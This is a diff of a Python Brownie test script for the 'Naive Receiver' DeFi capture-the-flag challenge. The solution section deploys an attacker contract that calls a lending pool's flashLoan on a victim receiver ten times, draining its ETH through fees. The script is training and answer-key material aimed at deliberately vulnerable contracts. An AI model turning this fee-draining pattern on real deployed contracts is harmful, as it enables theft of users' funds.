@@ -1,13 +1,10 @@
 from scripts.helper.utils import *
-from brownie import NaiveReceiverLenderPool, FlashLoanReceiver, NaiveReceiverAttack
+from brownie import NaiveReceiverLenderPool, FlashLoanReceiver
 
-def main():
+def test_solve_challenge():
     ####################################################################
     ######### SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE #########
     ####################################################################
-
-    # starting setup messages
-    message('setup_start')
 
     # tokens in pool and tokens in receiver
     ETHER_IN_POOL = ether_to_wei(1000)
@@ -36,23 +33,15 @@ def main():
     assert receiver.balance() == ETHER_IN_RECEIVER
 
     # check if solved
-    def solution_assertion():
-        message('final_assertion_check')
-        try:
+    def check_solution():
+        ############################################
+        ############ SUCCESS CONDITIONS ############
+        ############################################
 
-            ############################################
-            ############ SUCCESS CONDITIONS ############
-            ############################################
-            # All ETH has been drained from the receiver
-            assert receiver.balance() == 0
-            assert pool.balance() == ETHER_IN_POOL + ETHER_IN_RECEIVER
-            return True
-        except:
-            return False
+        # All ETH has been drained from the receiver
+        assert receiver.balance() == 0
+        assert pool.balance() == ETHER_IN_POOL + ETHER_IN_RECEIVER
 
-    # done setting up
-    message('setup_end')
-    message('solution_start')
 # #########################################################
 # There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.
 #
@@ -65,14 +54,14 @@ def main():
     ##### SOLUTION GOES HERE #####
     ##############################
 
+    # import the attacker contract
+    from brownie import NaiveReceiverAttack
+
     # deploy attacker contract which calls `flashLoan` to the receiver 10 times in a loop
     attacker_contract = NaiveReceiverAttack.deploy(receiver.address, pool.address, _fromAttacker)
 
     # call `attack()` to start the attack
     attacker_contract.attack(_fromAttacker)
 
-###############################################################
-###################### CHECKING SOLUTION ######################
-###############################################################
-    message('solution_end')
-    print(f'Challenge is solved: {solution_assertion()}')
+    ######################
+    check_solution()
